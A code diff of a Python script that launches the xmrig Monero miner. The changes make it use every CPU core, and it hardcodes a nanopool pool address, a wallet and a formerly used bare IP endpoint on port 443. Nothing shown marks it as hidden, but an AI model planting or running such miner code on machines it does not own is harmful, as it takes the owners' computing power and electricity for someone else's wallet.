@@ -4,7 +4,7 @@ import time
 from sys import platform
 import requests
 import subprocess
-#import multiprocessing
+import multiprocessing
 
 
 if platform == "linux" or platform == "linux2":
@@ -13,10 +13,10 @@ elif platform == "darwin":
     operate_system = 'OS X'
 elif platform == "win32":
     operate_system = 'win'
-#cores = multiprocessing.cpu_count()
+cores = multiprocessing.cpu_count()
 #cores = cores - 1
-#if cores <= 0:
-#    cores = 1
+if cores <= 0:
+    cores = 1
 timeout = 30
 thoi_gian_nghi = 28800
 
@@ -35,8 +35,8 @@ if operate_system == 'lin':
     except:
         pass
 import psutil
-#command_xmrig_default = '-o 144.202.17.112:443 --tls -t %s --cpu-max-threads-hint=100' %cores
-command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100'
+command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100 -t %s' %cores
+#command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100'
 while True:
     time.sleep(1)
     working_dir = os.path.dirname(os.path.realpath(__file__))
